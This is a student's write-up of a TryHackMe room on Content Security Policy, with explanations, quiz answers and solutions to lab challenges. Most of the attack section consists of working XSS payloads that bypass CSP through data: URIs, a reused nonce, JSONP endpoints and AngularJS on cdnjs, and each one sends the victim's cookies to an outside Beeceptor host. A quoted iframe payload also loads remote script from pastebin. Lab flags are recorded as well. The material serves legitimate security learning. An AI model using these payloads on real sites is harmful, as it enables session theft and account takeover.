---
In this room you'll learn what CSP is, what it's used for and how to recognize vulnerabilities in a CSP header.
---

###  Introduction

﻿Welcome to the CSP room! In this room, you'll learn what CSP is, what it's used for, and how to exploit flaws in a flawed CSP configuration. If you don't know what XSS (Cross-site scripting) is, I would recommend checking out [the XSS room](https://tryhackme.com/room/xss), as you'll need to have some experience with XSS.

**What is CSP?**

Content Security Policy, or CSP, is a policy usually sent via an HTTP response header from the webserver to your browser when requesting a page that describes which sources of content the browser should allow to be loaded in, and which ones should be blocked. In case an XSS or data injection vulnerability is found in a website, CSP is designed to prevent this vulnerability from being exploited until it's properly patched, and should serve as an **extra layer** of protection, not as your only line of defense. 

A CSP policy can also be included within the page's HTML source code, using the <meta> tag, such as this:  
`<meta http-equiv="Content-Security-Policy" content="script-src 'none'; object-src 'none';">`  

  

﻿How can CSP be bypassed?

If you've found an XSS vulnerability in a website, but can't run any unauthorized code, the CSP of the website may be blocking it. What you'll need to do is read the policy sent by the server and see if any flaws in it could be exploited to successfully inject and execute your payload.  

Answer the questions below

What does CSP stand for?  

*Content Security Policy*

CSP is designed to add an additional layer of protection against the exploitation of what vulnerability?

*XSS*

In which part of the HTTP response does the server usually send the policy to the client?

*Header*
```
Content Security Policy (CSP) es un mecanismo de seguridad que te permite especificar qué recursos (como scripts, imágenes, etc.) un navegador web debe cargar y ejecutar para un sitio web en particular. Esto ayuda a prevenir ataques de inyección de scripts maliciosos, como el robo de sesión o la suplantación de identidad, mediante la restricción de la carga de contenido de origen desconocido.

Un ejemplo de configuración de CSP es el siguiente:


`Content-Security-Policy: default-src 'self'; img-src 'self' img.example.com; script-src 'self' code.jquery.com`

En este ejemplo, el navegador sólo permitirá que se carguen imágenes desde el mismo origen ( 'self' ) o desde img.example.com , y sólo permitirá que se ejecuten scripts desde el mismo origen o desde code.jquery.com.
```

### Directives

The CSP specification contains quite a few directives. In this room, we'll focus on the most popular and important ones, but if you'd like to dive deeper into CSP directives, I'd recommend checking out the [MDN page](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) about them.

**Some of the more commonly used directives are:**

`default-src` - As the name states, this directive is used as the **default**, which means if a certain resource is trying to be loaded and there isn't a directive specified for its type, it falls back to default-src to verify if it's allowed to load.

`script-src` - This directive specifies the sources wherefrom JavaScript scripts can be loaded and executed.

`connect-src` - This directive specifies to which locations can JavaScript code perform AJAX requests (think XMLHTTPRequest or fetch).

`style-src / img-src / font-src / media-src` - These directives specify from which locations CSS stylesheets, images, fonts and media files (audio/video) respectively can be loaded

`frame-src / child-src` - This directive defines which locations can be embedded on the webpage via (i)frames.

`report-uri` - This is a special directive that will instruct the browser report all violations of your Content Security Policy via a POST request to a particular URL. This is useful if you're trying to find potential code injection vulnerabilities or locations where your CSP may break the functionality of your website. This directive is deprecated and will soon be replaced by the **report-to** directive, but for now, it remains in use. If you'd like to learn more about it, visit the [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri) page for more information.

There are also quite a few other directives that I won't be focusing on in this course. If you're interested in the complete list of directives, [content-security-policy.com](https://content-security-policy.com/#directive) provides this and much more useful information.  

Answer the questions below

Which directive can we use to restrict the loading of scripts on our website?

*script-src*

Which directive can we use to restrict the loading of videos on our website?  

*media-src*

If we want to log CSP violations, which directive do we need to set to have the browser report violations to us?

*report-uri*

```
AJAX es el acrónimo de Asynchronous JavaScript and XML. Es una técnica que permite a los desarrolladores web hacer peticiones a un servidor web y actualizar sólo una parte de una página web sin tener que recargar la página completa. Esto permite crear aplicaciones web más interactivas y fluidas.

Un ejemplo de cómo se realiza una petición AJAX con el objeto XMLHttpRequest es el siguiente:


`var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() {     if (this.readyState == 4 && this.status == 200) {        // Aqui se maneja la respuesta del servidor        document.getElementById("demo").innerHTML = this.responseText;     } }; xhttp.open("GET", "ajax_info.txt", true); xhttp.send();`

En este ejemplo se crea un nuevo objeto XMLHttpRequest, se define una función para manejar la respuesta del servidor, se abre una conexión GET con el archivo "ajax_info.txt" y se envía la petición al servidor. Si el servidor responde con éxito, la respuesta se inserta en un elemento con el ID "demo".

Existen otras alternativas como Jquery.ajax() que es una manera mas resumida y algo mas amigable de realizar peticiones Ajax, también puedes usar FetchAPI o Axios dependiendo de tu stack de trabajo.

Un iframe es un elemento HTML que permite a los desarrolladores web insertar una página web dentro de otra página web. El contenido del iframe se mostrará en un área rectangular dentro de la página principal y puede ser de cualquier origen, incluso de otro dominio.

Ejemplo de cómo se utiliza un iframe:


`<iframe src="https://www.example.com" width="600" height="400"></iframe>`

en este ejemplo se establece un iframe que mostrara la pagina web "[https://www.example.com](https://www.example.com/)" con un ancho de 600px y un alto de 400px.

Aunque iframes son ampliamente utilizadas para mostrar contenido de terceros, también son utilizadas para mostrar contenido de un mismo sitio web que se desea separar del resto de la página, o simplemente para mostrar contenido que se quiere descargar de manera asíncrona.

Es importante mencionar que iframes pueden presentar problemas de seguridad si no se utilizan correctamente, ya que pueden ser utilizadas para ataques como el clickjacking, por lo que es importante utilizarlos de manera correcta y en caso necesario utilizar medidas de seguridad adicionales como la utilización de Content Security Policy.

CORS es el acrónimo de "Cross-Origin Resource Sharing". Es un mecanismo de seguridad que permite que un servidor web decida si debe o no permitir que una página web de un origen diferente acceda a sus recursos.

Cuando un navegador envía una solicitud a un servidor para acceder a un recurso, el servidor puede incluir información en su respuesta que indica qué origen está autorizado a acceder al recurso. El navegador luego verifica esta información antes de permitir que el JavaScript en la página web acceda al recurso.

Un ejemplo de cómo un servidor puede configurar CORS es el siguiente:



`Access-Control-Allow-Origin: https://www.example.com`

En este ejemplo, el servidor está indicando que sólo las páginas web que tengan origen "[https://www.example.com](https://www.example.com/)" podrán acceder a sus recursos. El servidor puede permitir cualquier origen, especificar varios orígenes permitidos, o utilizar un comodín (*) para permitir cualquier origen.

CORS es un mecanismo de seguridad importante, ya que ayuda a prevenir ataques de origen cruzado, que podrían permitir a un atacante acceder a información confidencial o realizar acciones maliciosas en nombre de un usuario. Sin embargo, también puede causar problemas de acceso si no se configura correctamente, por lo que es importante entender cómo funciona y cómo configurarlo adecuadamente.
```


### Sources

**Sources**  
After a directive in the policy comes a list of sources that specify wherefrom the particular resources are allowed to be loaded. Here are some of the most commonly used sources:

`*` - This source is a **wildcard**, which means content for that specific directive can be loaded **from anywhere**. It's recommended **not** to use this source for script-src as it will essentially allow loading scripts from any URL.

`'none'` - This is the opposite of the wildcard (*) source as it fully disallows loading resources of the specified directive type from anywhere. For example, if you know you won't be serving certain content on your website, such as music or videos, you can just set the directive to 'none' in your CSP like so: `media-src 'none'`

`'self'` - This source allows you to load resources that are hosted on the same protocol (http/https), hostname (example.com), and port (80/443) as the website. For example, if you're accessing a site such as `https://example.com` and it has the CSP header set to `default-src 'self'`, you **won't be able to load** any scripts, images or stylesheets from https://subdomain.example.com, **http**://example.com or https://example.org.

`'unsafe-inline'` - This source allows the use of inline stylesheets, inline JavaScript and event attributes like onclick. **This source is considered unsafe and should be avoided.**

`'unsafe-eval'` - This source allows additional JavaScript code to be executed using functions such as eval() by JS code that's already permitted within the policy. This is usually safe unless a vulnerability is found in the code that runs on the page or the script-src sources are very loose, for example allowing any script to be loaded from a CDN.

`example.com` - This source would allow you to load resources from the domain example.com, **but not** its subdomains

`*.example.com` - This source would allow you to load resources from all of the subdomains of example.com, but not the base domain.  

`data:` - Adding this source to a directive would allow resources to be loaded from a data: url. **For script-src, this source is also considered unsafe and should be avoided.** Here are some examples of data: urls:

-   `data:image/png;base64,iVBORw0KGgo...`
-   `data:application/javascript,alert(1337)`

There's also a couple of special sources, which are usually used in combination with some of the above to ensure only allowed resources are loaded, whilst maintaining convenience for the site owners.

`nonce-`: This allows a resource to load if it has a matching nonce attribute. The nonce is a random string that is generated for every request. It is usually used for loading inline JS code or CSS styles. It needs to be unique for every request, as if a nonce is predictable, it can be bypassed.  
For example, if a server sends the following header: `script-src 'unsafe-inline' 'nonce-GJYTxu'`, the browser will only execute scripts that have the attribute set, like so: `<script nonce="GJYTxu">alert(1)</script>`

`sha256-`: This is simply a SHA256 hash encoded via Base64 used as a checksum to verify that the content of the resource matches up with what's allowed by the server. Currently, `sha256`, `sha384`, and `sha512` are by the CSP standard. This is usually used only for inline JS code or CSS styles but can be used to verify external scripts and/or stylesheets too. We can generate a SHA256 hash of an inline script we're intending to use by using a tool to generate it such as the one at [report-uri.com](https://report-uri.com/home/hash) or simply running it on a webpage with a restrictive CSP header and then extracting the hash from the console error.  
For example, if we're looking to run the following JS on our website inline: `alert(1337)`, we'll need to compute a SHA256 hash. I went ahead and did that, and the hash for the above code would be `'sha256-EKy4VsCHbHLlljt6SkTuD/eXpDbYHR1miZSY8h2DjDc='`. Now we can add that to our policy, like so: `script-src 'sha256-EKy4VsCHbHLlljt6SkTuD/eXpDbYHR1miZSY8h2DjDc='`. Once that's added, the inline script should run as normal.

Answer the questions below

If we want to allow script execution via functions such as eval() from already trusted scripts, what source should we allow in our script-src directive?  

*'unsafe-eval'*

What directive-source combination should we add to our policy if we want to specifically block all JavaScript content from running on our website?

*script-src 'none'*

```
Un Content Delivery Network (CDN) es un sistema distribuido de servidores que ayudan a reducir la latencia y el ancho de banda al entregar contenido web a los usuarios. Estos servidores están ubicados en diferentes regiones geográficas y tienen como objetivo entregar contenido a los usuarios desde el servidor más cercano a su ubicación, lo que reduce la latencia y mejora la velocidad de carga de la página web.

Un ejemplo de cómo funciona un CDN es el siguiente:

1.  Un usuario solicita una página web.
2.  El navegador envía una solicitud al servidor CDN.
3.  El servidor CDN selecciona el servidor más cercano al usuario.
4.  El servidor CDN entrega la página web al usuario desde el servidor seleccionado.

Los CDN son especialmente útiles para sitios web con un gran tráfico y/o contenido estático pesado (como imágenes, videos, etc.) ya que reducen la carga en el servidor principal y mejoran la experiencia del usuario al entregar el contenido de manera más rápida.

Ademas de mejorar la velocidad y performance, CDN tambien ayudan a proteger tu sitio contra ataques DDoS, ayudando a distribuir la carga de peticiones de manera equilibrada y no afectando el rendimiento del sitio.

Existen varios proveedores de CDN como Akamai, Cloudflare, Amazon Cloudfront y otros, permitiendo configurar y personalizar tu CDN para cumplir con tus necesidades y objetivos.

Un script inline es un código JavaScript que se escribe directamente dentro de una página HTML, en lugar de ser cargado desde un archivo externo. Los scripts inline se escriben dentro de una etiqueta `<script>` en el cuerpo del documento HTML.

Ejemplo de código HTML con un script inline:

`<!DOCTYPE html> <html>   <head>     <title>Ejemplo de script inline</title>   </head>   <body>     <h1>Ejemplo de script inline</h1>     <script>       alert("Hola, soy un script inline");     </script>   </body> </html>`

En este ejemplo, el script se encuentra dentro de la etiqueta `<script>` y contiene una función `alert()` que mostrará un mensaje en pantalla cuando la página sea cargada.

Los scripts inline son útiles para incluir código JavaScript que se ejecute en una sola página o que sea específico de una página. Sin embargo, también presentan algunos riesgos de seguridad, ya que el código JavaScript se encuentra directamente en la página HTML y puede ser modificado fácilmente para inyectar código malicioso. Por lo tanto, es recomendable evitar su uso y utilizar scripts externos y medidas de seguridad adicionales para proteger la aplicación.
```

![[Pasted image 20230111132750.png]]



###  Creating a Content Security Policy

Now that we've mentioned some of the most commonly used sources, we can talk about how to build your security policy for your website. For a more interactive way of building your policy, I'd recommend [**report-uri.com's CSP generator**](https://report-uri.com/home/generate) as it's a great tool that you can use to experiment with various CSP settings without having to type them out manually. 

  

When creating a CSP policy, I would recommend setting the **default-src** directive to 'self'. This ensures all resources by default will only be allowed to load from your website and nowhere else. If all the content (scripts, images, media...) is hosted on your site, this is all you'll need to set. If you load some of the content on your site from external sources (for example, images from a hosting site such as imgur.com), you can adjust the rest of the directives according to your needs.

When setting up the **script-src** directive and its sources, you should pay special attention to what you're allowing to load. If you're loading a script from an external source such as a CDN, make sure you're specifying the full URL of the script or a nonce/SHA hash of it and **not** just the hostname where it's hosted at, unless you're 100% sure no scripts that could be used to bypass your policy are hosted there. For example, if you're including [jQuery from cdnjs](https://cdnjs.com/libraries/jquery) on your website, you should include the full URL of the script (`script-src cdnjs.cloudflare.com/ajax/.../jquery.min.js`) or the SHA256 hash in your policy. Most CDNs allow you to get the script hash somewhere on their site. For example, on cdnjs, you can get it by clicking "Copy SRI" on the Copy dropdown.

**Inline JS**

If you need to include inline JavaScript or stylesheets in your website, you'll need to set up a nonce generator on the server-side, or compute SHA hashes of your inline scripts and then include them in your policy. There are loads of great libraries for most languages that allow you to do this with minimal effort. For example, if you're working with an Express-based website, I would recommend using the [helmet-csp](https://www.npmjs.com/package/helmet-csp) module available on npm, which randomly generates the nonce for you. If you're looking to hash your inline scripts, you can use an online tool such as [report-uri.com's hash generator](https://report-uri.com/home/hash) or you can use a tool such as [AutoCSP](https://github.com/fcsonline/autocsp) to automatically generate your hashes for you. 

  

Note that if you serve JSONP endpoints on your website, you may need to take additional precautions. If you're not sure whether you serve JSONP endpoints or not, you _probably_ don't.  

Answer the questions below

What hashing algorithm can you use to verify the scripts being loaded? (Without the numbers)

*sha*

Can you include the URLs of the permitted scripts directly in your security policy? _(Yes / No)_

*yes*

```
jQuery is a JavaScript library that makes it easier to interact with HTML documents, handle events, create animations, and develop cross-browser JavaScript applications. jQuery simplifies a lot of the complicated tasks that are common in JavaScript, making it a popular choice for web developers.

A CDN (Content Delivery Network) is a network of servers distributed around the world that work together to deliver web content to users based on their geographic location. cdnjs is a free and open-source content delivery network for popular JavaScript libraries, including jQuery. By using a CDN, developers can reduce the load on their own servers and improve the performance and reliability of their websites by taking advantage of the globally distributed network of servers provided by cdnjs.

When you include jQuery from the cdnjs the browser will look for a copy of jQuery stored on the CDN's servers, rather than on your own server, which can potentially speed up the loading of your webpage.

Express.js, commonly referred to as simply "Express," is a popular JavaScript framework for building web applications and APIs. It is built on top of the Node.js platform and provides a minimal and flexible set of features for web and mobile applications.

An Express-based website is a website that is built using the Express framework. When building an Express-based website, you would use JavaScript to write the server-side logic for the website, and you would use the Express framework to define routes, handle requests and responses, and perform other tasks that are commonly needed when building web applications. Express allows developers to easily create routing,middlewares, template engines and lot of functionality around HTTP Protocol.

Express is designed to be minimal and flexible, making it a good choice for small to medium-sized web applications, but can also scale to be used in large-scale applications as well.


JSONP (JSON with Padding) is a technique for making cross-origin requests from a web page to a server, and getting a response in the form of a JavaScript script. JSONP endpoints refer to the server-side endpoint, which is a specific URL that the client-side JavaScript code can make a request to, in order to retrieve or submit data in the JSONP format.

The JSONP technique is used to bypass the same-origin policy, which is a security feature implemented by web browsers that prevents JavaScript code from making requests to a different domain than the one the JavaScript code came from.

Normally, web browsers block such cross-origin requests, but JSONP is able to bypass this restriction by taking advantage of a feature of JavaScript called script tags. The client-side JavaScript code creates a script tag, sets the src attribute of the tag to the JSONP endpoint URL, and appends the tag to the HTML document. When the script tag is executed, it loads the JavaScript code from the JSONP endpoint, and the JavaScript code can then parse the JSON data and use it to update the web page.

JSONP has some security implications, that's why in most of the cases it has been replaced by CORS (Cross-Origin Resource Sharing) which is a more secure method for making cross-origin requests, it allows the server to control which origin domains are allowed to access the resources.

```

### Bypassing a Content Security Policy

Since we now know how to create content security policies, let's learn how to find bypasses for them.

If you're looking for a quick way to check if your policy has any potential bypass vectors in it, I would recommend using **Google's [CSP Evaluator](https://csp-evaluator.withgoogle.com/)**. It's able to detect various mistakes in any CSP configuration.

**JSONP endpoints**

﻿Some sites may serve JSONP endpoints which call a JavaScript function in their response. If the callback function of these can be changed, they could be used to bypass the CSP and demonstrate a proof of concept, such as displaying an alert box or potentially even exfiltrating sensitive information from the client such as cookies or authentication tokens. A lot of popular websites serve JSONP endpoints, which can be usually used to bypass a security policy on a website that uses their services. The [JSONBee](https://github.com/zigoo0/JSONBee) repo lists a good amount of the currently available JSONP endpoints that can be used to bypass a website's security policy.  

**Unsafe CSP configurations**

Some sites may allow loading of resources from unsafe sources, for example by allowing data: URIs or using the 'unsafe-inline' source. For example, if a website allows loading scripts from data: URIs, you can simply bypass their policy by moving your payload to the src attribute of the script, like so: `<script src="data:application/javascript,alert(1)"></script>`

  

﻿**Exfiltration**

﻿To exfiltrate sensitive information, your client needs to connect to a webserver you control. For our purposes, we can use a free service such as [Beeceptor](https://beeceptor.com/) to receive the information via the path of the request. If you have access to a paid service such as Burp Collaborator, you can use this instead.

If you prefer running a web server for exfiltration locally, you can set up a simple HTTP server using python by running `python -m SimpleHTTPServer` or `python3 -m http.server`.

If the website you're exploiting allows AJAX requests (via `connect-src`) to anywhere, you can create a fetch request to your server like so:

``<script>fetch(`http://example.com/${document.cookie}`)</script>``

When the script is triggered on the victim's machine, you'll see their cookies show up in your access log, like so:

![](https://i.imgur.com/edr8tNa.png)  

  

If you found an XSS vulnerability and bypassed CSP, but can't leak any information with it via XHR requests or fetch, the `connect-src` policy may be blocking your requests. This can be bypassed if the website you're exploiting doesn't have strict settings for directives such as image-src and media-src, which can be abused to leak information.  

For example, if a website is blocking all of your XHR requests but allows images to be loaded from any location, you can abuse this with JavaScript to load a specially crafted URL that masquerades as an image, like so:``<script>(new Image()).src = `https://example.com/${encodeURIComponent(document.cookie)}`</script>``

Answer the questions below

If Ajax/XHR requests are blocked, can we still exfiltrate sensitive information? (Yes / No)

*Yes*

```
XHR (XMLHttpRequest) is an API in the form of an object that allows web pages to send and receive data from a server asynchronously, without the need to refresh the entire page. This allows web pages to update their content dynamically, without the user having to navigate to a new page or refresh the current page.

XHR requests are commonly used in AJAX (Asynchronous JavaScript and XML) applications to dynamically update the content of a web page without requiring a full page refresh. When a web page makes an XHR request, it sends an HTTP request to a server-side endpoint, such as a PHP script or a JSON file, and waits for a response. The response can be in the form of XML, HTML, JSON or plain text. Once the response is received, JavaScript code on the web page can update the page's content using the data from the response.

The `XMLHttpRequest` API is supported by all major web browsers, including Internet Explorer, Google Chrome, Firefox, Safari and Edge.

You can create a XHR Object and use the various method of it to make the request and handle the responses. `XMLHttpRequest` has some level of complexity comparing to `fetch()` API, but can be useful in certain cases like handling request timeouts, caching and managing low-level details of the request.

--
The provided code is an example of JavaScript code that uses the `fetch()` function to make an HTTP request to a server-side endpoint. The `fetch()` function is a JavaScript function that allows you to make network requests and retrieve responses.

The code is making a request to the `http://example.com` URL, appending the current document's cookie to the end of the URL using `document.cookie`. A cookie is a small piece of data stored on the client's browser, by website. This data can be read by the server on every subsequent requests, allowing the server to recognize the user and personalize the experience.

This is an example of a security vulnerability called "Cross-Site Scripting" (XSS). It occurs when an attacker can execute their own script on another user's browser by injecting malicious code into a website. In this case, an attacker could potentially use this script to steal sensitive information stored in the cookies of other users visiting the website, if the website does not have proper XSS protection in place.

It is important to take necessary measures to protect web application from XSS by using best practices such as input validation,encoding and sanitizing inputs to prevent malicious scripts from being executed.

--
The provided code is an example of JavaScript code that creates a new `Image` object and sets the `src` property of the object to a URL that includes the current document's cookie. When the `src` property is set, the browser will automatically create a GET request to the specified URL, and the server will receive the request along with the cookie data appended to the end of the URL.

This is also an example of a security vulnerability called "Cross-Site Scripting" (XSS), similar to the previous example. The script is injecting the `document.cookie` into the request as a parameter and it could allow an attacker to steal sensitive information stored in the cookies of other users visiting the website.

Also, it is important to notice that the `encodeURIComponent` function is being used to encode the cookie, this is a built-in JavaScript function that encodes a string so that it can be safely used in a URL. This is done to avoid issues with special characters and spaces that may be present in the cookie data.

Again, in order to prevent these types of vulnerabilities, it is crucial to use proper input validation, sanitizing and encoding on both client and server-side to ensure the data is safe before being used in any requests, including cookies.
```

### CSP Sandbox

 Start Machine

Time to put your practice to test! I've created a VM that is intentionally vulnerable to XSS but uses various content security policies to mitigate it. You should be able to test what you've learned so far. It consists of 10 challenges, 7 of which are **attack** and 3 are **defend**, and also a playground where you can test your own CSP configurations.

You can access the introduction at [http://MACHINE_IP/](http://machine_ip/). 

Answer the questions below

I have deployed the CSP Sandbox machine.

### CSP Sandbox :: Attack challenges

To deploy the machine, go to the **CSP Sandbox** task.  

**Attack** challenges require you to bypass the CSP header sent by the webpage and exfiltrate the administrator's cookies. For methods on how you can achieve this, refer to the _Bypassing CSP_ task of this room.  

_For verification, all challenges are accessed by a bot locally (**localhost**)._

Answer the questions below

![[Pasted image 20230111195911.png]]

![[Pasted image 20230112131251.png]]

Flag for attack-1  

```

https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass

https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/
CVE-2020-6519

document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";

payload to use for challenge

fetch(`https://urcsp.free.beeceptor.com/${document.cookie}`)

eval(document.location='https://urcsp.free.beeceptor.com/'.concat(document.cookie))


┌──(kali㉿kali)-[~/nappy]
└─$ curl http://34.243.75.161:3001/ -I
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Security-Policy: default-src * 'unsafe-inline';  (here)
Content-Type: text/html; charset=utf-8
Content-Length: 390
ETag: W/"186-PB8tVHaonwWPTr4sUZCK/MqA5KY"
Date: Thu, 12 Jan 2023 01:24:23 GMT
Connection: keep-alive


enter text:

<script>fetch(`https://witty.free.beeceptor.com/${document.cookie}`)</script>

or

<script>eval(document.location='https://witty.free.beeceptor.com/'.concat(document.cookie))</script>

or

<BoDY onload=eval(document.location='https://witty.free.beeceptor.com/'.concat(document.cookie))>

using https://beeceptor.com/

to fetch

GET `/flag=THM%7BTh4t_W4s_Pr3tty_3asy%7D`

200 0.0s 4 minutes ago

then decode url with cyberchef flag=THM{Th4t_W4s_Pr3tty_3asy}
```


*THM{Th4t_W4s_Pr3tty_3asy}*

Flag for attack-2  

```
┌──(kali㉿kali)-[~/nappy]
└─$ curl http://34.243.75.161:3002/ -I
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Security-Policy: default-src *; style-src 'self'; script-src data:
Content-Type: text/html; charset=utf-8
Content-Length: 390
ETag: W/"186-Py/FKQRGfs98M/Yc8k680Qm1cF0"
Date: Thu, 12 Jan 2023 01:24:59 GMT
Connection: keep-alive

enter text:

<script src="data:application/javascript,fetch(`https://witty.free.beeceptor.com/${document.cookie}`)"></script>

or

<script src="data:application/javascript,eval(document.location='https://witty.free.beeceptor.com/'.concat(document.cookie))"></script>

or

┌──(kali㉿kali)-[~/nappy]
└─$ echo -n 'fetch(`https://witty.free.beeceptor.com/${document.cookie}`)' | base64
ZmV0Y2goYGh0dHBzOi8vd2l0dHkuZnJlZS5iZWVjZXB0b3IuY29tLyR7ZG9jdW1lbnQuY29va2ll
fWAp


<script src="data:;base64,ZmV0Y2goYGh0dHBzOi8vd2l0dHkuZnJlZS5iZWVjZXB0b3IuY29tLyR7ZG9jdW1lbnQuY29va2ll
fWAp"></script>

:)


GET `/flag=THM%7BUs1ng_data:_1snt_Any_S4fer%7D`

200 0.0s a few seconds ago

flag=THM{Us1ng_data:_1snt_Any_S4fer}

```


*THM{Us1ng_data:_1snt_Any_S4fer}*

Flag for attack-3  

```
┌──(kali㉿kali)-[~/nappy]
└─$ curl http://34.243.75.161:3003/ -I
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; script-src 'unsafe-inline'
Content-Type: text/html; charset=utf-8
Content-Length: 390
ETag: W/"186-Tk8eKoRn272qfFoaFdWERRH8q5I"
Date: Thu, 12 Jan 2023 01:29:18 GMT
Connection: keep-alive

enter text:
<script>(new Image()).src = `https://witty.free.beeceptor.com/${encodeURIComponent(document.cookie)}`</script>

or

<IMG id="witty" src="">
<script>document.getElementById('witty').src="https://witty.free.beeceptor.com/" + document.cookie;</script>


GET `/flag%3DTHM%7BTh4ts_N0t_4n_1m4ge!!%7D`

200 0.0s a few seconds ago

flag=THM{Th4ts_N0t_4n_1m4ge!!}

```

*THM{Th4ts_N0t_4n_1m4ge!!}*

Flag for attack-4  

```
┌──(kali㉿kali)-[~/nappy]
└─$ curl http://34.243.75.161:3004/ -I
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Security-Policy: default-src 'none'; style-src * 'self'; script-src 'nonce-abcdef'
Content-Type: text/html; charset=utf-8
Content-Length: 390
ETag: W/"186-k9TfFAl9EuH3JyjY2OwJDOKF5g0"
Date: Thu, 12 Jan 2023 01:44:48 GMT
Connection: keep-alive

<script nonce="abcdef">eval(document.location='https://witty.free.beeceptor.com/'.concat(document.cookie))</script>

or

<link id="witty" rel=stylesheet href="" /><script nonce="abcdef">document.getElementById('witty').href="https://witty.free.beeceptor.com/" + document.cookie;</script>

GET `/flag=THM%7BStyle_Y0ur_W3bs1teS%7D`

200 0.0s 3 minutes ago

flag=THM{Style_Y0ur_W3bs1teS}
```

*THM{Style_Y0ur_W3bs1teS}*

Flag for attack-5  

```
┌──(kali㉿kali)-[~/nappy]
└─$ curl http://34.243.75.161:3005/ -I
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Security-Policy: default-src 'none'; style-src 'self'; img-src *; script-src 'unsafe-eval' *.google.com
Content-Type: text/html; charset=utf-8
Content-Length: 390
ETag: W/"186-RgvJ6xDqmBUDrHWsndjbCIZvwVE"
Date: Thu, 12 Jan 2023 02:55:46 GMT
Connection: keep-alive

nice writeup: https://weizman.github.io/page-whatsapp-vuln/

https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt


#Google.com:

"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>

"><script src="https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)"></script>

"><script src="https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)"></script>

"><script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>

"><script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>

*.google.com (subdomain)


<script src="https://accounts.google.com/o/oauth2/revoke?callback=eval(document.location='https://witty.free.beeceptor.com/'.concat(document.cookie))"></script>


GET `/flag=THM%7BN0_JSONP_D0mains_Plz%7D`

429 0.0s a minute ago (cz many requests (free acc))

flag=THM{N0_JSONP_D0mains_Plz}


```


*THM{N0_JSONP_D0mains_Plz}*

Flag for attack-6  

```
┌──(kali㉿kali)-[~/nappy]
└─$ curl http://34.245.72.50:3006/ -I
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; script-src 'unsafe-eval' cdnjs.cloudflare.com
Content-Type: text/html; charset=utf-8
Content-Length: 390
ETag: W/"186-dyUmDNHThGqYNHzzoVqcbliNcLE"
Date: Thu, 12 Jan 2023 04:05:44 GMT
Connection: keep-alive

Cloudflare es una empresa que ofrece una variedad de servicios de seguridad y desempeño para sitios web. Sus servicios incluyen protección contra ataques DDoS, aceleración de contenido, y privacidad DNS. También ofrece opciones para mejorar la seguridad del sitio, como la autenticación de usuarios y la encriptación SSL. Es usado para proteger y optimizar la disponibilidad y seguridad de las aplicaciones web.

https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass

<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{$on.curry.call().document.location='https://witty.free.beeceptor.com/' + $on.curry.call().document.cookie}}
</div>

or

<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js" integrity="sha512-C4LuwXQtQOF1iTRy3zwClYLsLgFLlG8nCV5dCxDjPcWsyFelQXzi3efHRjptsOzbHwwnXC3ZU+sWUh1gmxaTBA==" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().document.location='https://witty.free.beeceptor.com/' + $on.curry.call().document.cookie}}
</div>


GET `/flag=THM%7BTrust_N0_CDN%7D`

429 0.0s a few seconds ago

flag=THM{Trust_N0_CDN}

```


*THM{Trust_N0_CDN}*

Flag for attack-7  

The 404 error looks kinda weird...

```
┌──(kali㉿kali)-[~/nappy]
└─$ curl http://34.245.72.50:3007/ -I
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Security-Policy: default-src 'none'; media-src *; style-src 'self'; script-src 'self'
Content-Type: text/html; charset=utf-8
Content-Length: 390
ETag: W/"186-EZI6yduyqDsJUnzCnKoXDx69AdA"
Date: Thu, 12 Jan 2023 04:43:47 GMT
Connection: keep-alive

<script src="/'; new Audio('https://witty.free.beeceptor.com/'+document.cookie);'"></script>

GET `/flag=THM%7BTh1s_4udio_S0unds_N1ce%7D`

429 0.0s a few seconds ago

flag=THM{Th1s_4udio_S0unds_N1ce}

This appears to be a script that attempts to inject malicious code into a website. The script attempts to load an audio file from a remote server, and appends the current user's cookies to the URL. The script could potentially be used to steal user data, or execute other malicious actions. It's important not to execute this script or to be careful when visiting websites that use it.


```


*THM{Th1s_4udio_S0unds_N1ce}*


### CSP Sandbox :: Defend challenges

To deploy the machine, go to the **CSP Sandbox** task.  

**Defend** challenges require you to defend the website from XSS attacks by creating a CSP header that blocks them, whilst allowing the legitimate scripts to execute.

Answer the questions below

![[Pasted image 20230112131231.png]]

What is the flag for defend-1?  

```
http://54.229.103.59:3008/defend-1.js

const defend1Real = true;
console.log('__defend-1_REAL=' + defend1Real);

┌──(kali㉿kali)-[~/nappy]
└─$ curl http://54.229.103.59:3008/ -I
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 559
ETag: W/"22f-UkwilPDk3jkDrMwbmYqT0VEU9E0"
Date: Thu, 12 Jan 2023 18:14:11 GMT
Connection: keep-alive

adding: Content-Security-Policy: script-src 'self'

so enter

script-src 'self'


